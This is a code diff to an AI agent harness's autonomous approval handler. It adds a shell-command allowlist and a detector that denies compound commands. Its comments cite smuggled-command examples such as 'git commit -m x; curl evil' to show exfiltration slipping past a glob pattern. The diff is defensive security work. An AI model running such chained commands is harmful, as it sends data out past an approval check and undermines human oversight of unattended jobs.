@@ -245,6 +245,52 @@ class AsyncCallbackApprovalHandler(ApprovalHandler):
         return response.approved
 
 
+def _has_shell_control_operator(command: str) -> bool:
+    """True if ``command`` contains an unquoted shell control / substitution operator.
+
+    Scans for ``;``, ``|``, ``&`` and unquoted newlines (``\\n``/``\\r``) (command
+    separators) only when OUTSIDE a quoted span, so a literal ``;`` inside
+    ``git commit -m "a; b"`` is NOT flagged. Command substitution (``$(...)`` and
+    backticks) is flagged EVEN inside double quotes -- bash executes it there, and
+    this gate is for the single-command job allowlist where conservative denial is
+    safe (cost of a false positive = one auto-approve withheld; cost of a false
+    negative = exfil past the glob). Newline is a command separator under
+    ``shell=True`` (``run_shell``), so an unquoted ``\\n`` smuggles a second
+    command past the glob -- ``git commit -m x\\ncurl evil`` would match
+    ``git commit*`` and run both. A newline INSIDE a quoted span (a multi-line
+    commit message) is not a separator and is correctly left unflagged.
+    """
+    i = 0
+    n = len(command)
+    quote: str | None = None
+    while i < n:
+        ch = command[i]
+        # Substitution works even inside double quotes -- check before quote skip.
+        if ch == "`":
+            return True
+        if ch == "$" and command[i : i + 2] == "$(":
+            return True
+        if quote is not None:
+            if ch == "\\" and i + 1 < n:
+                i += 2
+                continue
+            if ch == quote:
+                quote = None
+            i += 1
+            continue
+        if ch in ("'", '"'):
+            quote = ch
+            i += 1
+            continue
+        if ch == "\\" and i + 1 < n:
+            i += 2
+            continue
+        if ch in (";", "|", "&", "\n", "\r"):
+            return True
+        i += 1
+    return False
+
+
 class AutonomousApprovalHandler(ApprovalHandler):
     """Autonomous-mode handler (M4): safe/moderate auto-approve; destructive → Trust DB or deny.
 
@@ -260,6 +306,13 @@ class AutonomousApprovalHandler(ApprovalHandler):
     use this instead of seeding a Trust-DB rule because the trust DB is shared
     across all pooled agents (one ``db_path``), so a persistent seeded rule
     would leak auto-approve to chat sessions.
+
+    ``shell_allowlist`` (Wave 2, ``jobs.shell_allowlist``) is the run_shell
+    analog: a job-scoped list of COMMAND glob patterns (``pytest*``,
+    ``git commit*``) auto-approved without a Trust-DB wildcard -- so an
+    unattended coding job can run its build/test/git commands while every
+    non-matching command still falls through to the trust-db-or-deny flow.
+    The hardcoded policy deny-list is re-checked first and always wins.
     """
 
     def __init__(
@@ -267,10 +320,40 @@ class AutonomousApprovalHandler(ApprovalHandler):
         trust_db: TrustDatabase | None = None,
         audit_trail: AuditTrail | None = None,
         auto_approve_tools: set[str] | None = None,
+        shell_allowlist: list[str] | None = None,
     ) -> None:
         self._trust_db = trust_db
         self.audit_trail = audit_trail
         self._auto_approve_tools = set(auto_approve_tools or ())
+        self._shell_allowlist = list(shell_allowlist or ())
+
+    def _shell_allowlist_decision(self, arguments: str) -> tuple[bool, str] | None:
+        """Match a run_shell command against the job allowlist.
+
+        Returns (approved, audit_reason) when the allowlist decides, or None to
+        fall through to the trust-db/deny flow (no pattern matched).
+        """
+        from fnmatch import fnmatch
+
+        from koboi.harness.policy import _extract_command, check_command_blocked
+
+        command = _extract_command(arguments)
+        if not command:
+            return None
+        blocked = check_command_blocked(command)
+        if blocked:
+            # Hardcoded safety wins even over a matching pattern.
+            return False, f"denied (job shell allowlist: {blocked})"
+        if _has_shell_control_operator(command):
+            # The allowlist auto-approves a SINGLE command. A control operator
+            # signals a compound command that could smuggle a non-matching
+            # command past the glob (``git commit*`` would match
+            # ``git commit -m x; curl evil``). Deny rather than risk exfil.
+            return False, "denied (job shell allowlist: compound command)"
+        for pattern in self._shell_allowlist:
+            if fnmatch(command, pattern):
+                return True, f"auto-approve (job shell allowlist: {pattern})"
+        return None
 
     def should_approve(self, tool_name: str, arguments: str, risk_level: RiskLevel) -> bool:
         # Job-scoped allowlist first: auto-approve (e.g. in-workdir writes for
@@ -286,14 +369,21 @@ class AutonomousApprovalHandler(ApprovalHandler):
                 source="Autonomous",
             )
             return True
+        # Wave 2: job-scoped shell COMMAND allowlist (glob on the command string).
+        if tool_name == "run_shell" and self._shell_allowlist:
+            decision = self._shell_allowlist_decision(arguments)
+            if decision is not None:
+                approved, reason = decision
+                self._audit(tool_name, arguments, risk_level, approved, reason, source="Autonomous")
+                return approved
         # Safe / moderate: allow (base behavior).
         if risk_level != RiskLevel.DESTRUCTIVE:
             return True
         # Destructive: check Trust DB; deny if no rule.
         if self._trust_db:
-            decision = self._trust_db.should_auto_approve(tool_name, risk_level, arguments)
-            if decision.auto_approve:
-                self._audit(tool_name, arguments, risk_level, True, decision.reason, source="Autonomous")
+            trust_decision = self._trust_db.should_auto_approve(tool_name, risk_level, arguments)
+            if trust_decision.auto_approve:
+                self._audit(tool_name, arguments, risk_level, True, trust_decision.reason, source="Autonomous")
                 return True
         self._audit(
             tool_name,
